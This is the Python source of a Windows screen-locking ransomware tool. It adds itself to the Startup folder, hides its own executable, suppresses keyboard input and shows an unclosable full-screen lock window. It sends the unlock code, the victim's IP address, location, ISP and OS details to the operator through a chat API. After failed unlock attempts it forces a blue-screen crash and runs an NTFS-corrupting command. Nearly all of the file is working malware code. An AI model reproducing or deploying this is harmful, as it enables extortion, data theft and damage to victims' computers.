# -*- coding: utf-8 -*-

# rebuild ui
# use all the ascii letters (optional)
# over write bootsector (optional)

from tkinter import(
    Tk as Tkinter,
    Button as TkinterButton,
    Label as TkinterLabel,
    Text as TkinterText,
    Entry as TkinterEntry,
    INSERT as TkinterInsert,
    END as TkinterEND,
    mainloop as TkinterLoop,
)
from tkinter.messagebox import(
    showinfo as TkinterShowInfo,
    showerror as TkinterShowError,
    showwarning as TkinterShowWarning
)

from platform import uname
from Config import Config
from socket import gethostbyname, gethostname
from requests import post, get, put
from functools import partial
from random import choice
import ctypes
import ctypes.wintypes
import getpass
import shutil
import string
import keyboard
import os
import subprocess
import sys
import time


class ScreenLocker:
    def __init__(self):
        self.wind = Tkinter()
        self.config = Config()
        self.api = self.config.api
        self.chat_id = self.config.chat_id
        self.uid = self.config.uid
        self.password = self.__GenerateString__()
        self.Window_title = self.config.Window_title
        self.title = self.config.title
        self.lock_text = self.config.lock_text
        self.attempts_remaining = self.config.attempts_remaining
        self.bat_path = self.__STARTUP__()

        self.unlock_instructions = self.config.unlock_instructions
        self.unlock_procedure = self.config.unlock_procedure
        self.unlock_steps = self.config.unlock_steps

        self.__UI__()
        self.__HOOKS__()
        self.__Send__()
        self.__MELT__()

    def __GenerateString__(self):
        return "".join(choice(string.digits) for _ in range(8))
    
    def __STARTUP__(self):
        bat_path = fr'C:\Users\{getpass.getuser()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        with open(os.path.join(bat_path, f"{os.path.basename(sys.argv[0])}.bat"), "w+") as bat_file:
            bat_file.write(r'start "" "%s"' % os.path.join(os.getcwd(), os.path.basename(sys.argv[0])))
        return bat_path

    def __BSOD__(self):
        subprocess.call("cd C:\:$i30:$bitmap", shell=True)
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

    def __UNINSTALL__(self):
        self.wind.destroy()
        os.remove(f"C:\Users\{getpass.getuser()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" + '\\' + f"{sys.argv[0]}.bat")
        keyboard.unhook_all()
        try:
            shutil.rmtree(os.path.join("C:\\", os.path.splitext(os.path.basename(sys.argv[0]))[0]))
        except Exception:
            pass

    def __UI__(self):
        self.wind.title(self.Window_title)
        self.wind["bg"] = "black"
        TkinterLabel(self.wind, bg="black", fg="red", padx=10, pady=10, text=f"\n\n{self.title}\n\n", font="helvetica 40").pack()
        TkinterLabel(self.wind, bg="black", fg="red", text=self.lock_text, font="helvetica 40").place(x=210, y=170)
        TkinterLabel(self.wind, bg='black', fg='red', font='helvetica 25 bold', text=self.unlock_procedure).place(x=50, y=290)

        unlock_info_text = TkinterText(self.wind, height=7, width=35, fg='red', bd=0, exportselection=0, bg='black', font='helvetica 19')
        unlock_info_text.place(x=50, y=340)
        unlock_info_text.insert(TkinterInsert, self.unlock_instructions)

        TkinterLabel(self.wind, bg='black', fg='red', font='helvetica 25 bold', text='How to unlock your computer').place(x=50, y=530)
        unlock_steps_text = TkinterText(self.wind, height=5, width=30, fg='red', bd=0, exportselection=0, bg='black', font='helvetica 19')
        unlock_steps_text.place(x=50, y=580)
        unlock_steps_text.insert(TkinterInsert, self.unlock_steps)

        self.enter_pass = TkinterEntry(self.wind, bg="black", bd=30, fg="red", text="", show='•', font="helvetica 35", width=11, insertwidth=4, justify="center")
        self.enter_pass.place(x=715, y=290)

        self.__CREATBTN__()
        self.wind.resizable(0, 0)
        self.wind.lift()
        self.wind.attributes('-topmost', True)
        self.wind.after_idle(self.wind.attributes, '-topmost', True)
        self.wind.attributes('-fullscreen', True)
        self.wind.protocol("WM_DELETE_WINDOW", self.__KILL__)

    def __CREATBTN__(self):
        left_value = 20
        moving_value = 80
        for i in range(1, 10):
            TkinterButton(self.wind, text=str(i), bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'), command=partial(self.__BUTTON__, str(i))).place(x=640 + (i % 3) * 150, y=450 + (i // 3) * 90)

        TkinterButton(self.wind, text="0", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'), command=partial(self.__BUTTON__, "0")).place(x=790 + 50, y=720)
        TkinterButton(self.wind, text="Delete", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'), command=self.__DELBUTTON__).place(x=640 + moving_value, y=720)
        TkinterButton(self.wind, text="Unlock", bg='#FF0000', fg='#ffffff', bd=5, height=2, width=7, font=('Helovitica 16'), command=self.__CHECK__).place(x=940 + left_value, y=720)

    def __BUTTON__(self, arg):
        self.enter_pass.insert(TkinterEND, arg)

    def __DELBUTTON__(self):
        self.enter_pass.delete(-1, TkinterEND)

    def __TAPP__(self, key):
        pass

    def __CHECK__(self):
        if self.enter_pass.get() == self.password:
            TkinterShowInfo("ScreenLocker", "UNLOCKED SUCCESSFULLY")
            self.__UNINSTALL__()
        else:
            self.attempts_remaining -= 1
            if self.attempts_remaining == 0:
                TkinterShowWarning("ScreenLocker", "number of attempts expired")
                self.__BSOD__()
            else:
                TkinterShowWarning("ScreenLocker", "Wrong password. Available tries: " + str(self.attempts_remaining))

    def __KILL__(self):
        TkinterShowWarning("ScreenLocker", "DEATH IS INEVITABLE")

    def __HOOKS__(self):
        keyboard.on_press(self.__TAPP__, suppress=True)
    
    def __MELT__(self):
        try:
            path = os.path.join("C:\\", os.path.splitext(os.path.basename(sys.argv[0]))[0])
            os.makedirs(path, exist_ok=True)
            subprocess.call(f'attrib +h "{path}"', shell=True)
            shutil.move(sys.argv[0], os.path.join(path, os.path.basename(sys.argv[0])))
        except Exception:
            pass

    def __Send__(self):
        try:
            ip_info = get("http://ip-api.com/json").json()
            self.api.SendMessage(self.chat_id, f"⚠️ *New Target Is Infected ! ...*\n➖➖➖➖➖➖➖➖\n*IP 🌐 :* `{ip_info['query']}`\n*Country ⛰ : {ip_info['country']}*\n*City 🏠 : {ip_info['city']}*\n*TimeZone 🧭 : {ip_info['timezone']}*\n*ISP 📡 : {ip_info['isp']}*\n➖➖➖➖➖➖➖➖\n*Password 🔑 : ```{self.password}```\n➖➖➖➖➖➖➖➖\n*Client 🖥 :* `{self.uid}`\n*Local IP 🌐 :* `{gethostbyname(gethostname())}`\n*OS : {uname()[0]}*\n*OS Version : {uname()[2]}*\n*OS Full Version : {uname()[3]}*\n*OS Architecture : {uname()[4]}*")
        except Exception:
            pass

if __name__ == "__main__":
    ScreenLocker()
    TkinterLoop()
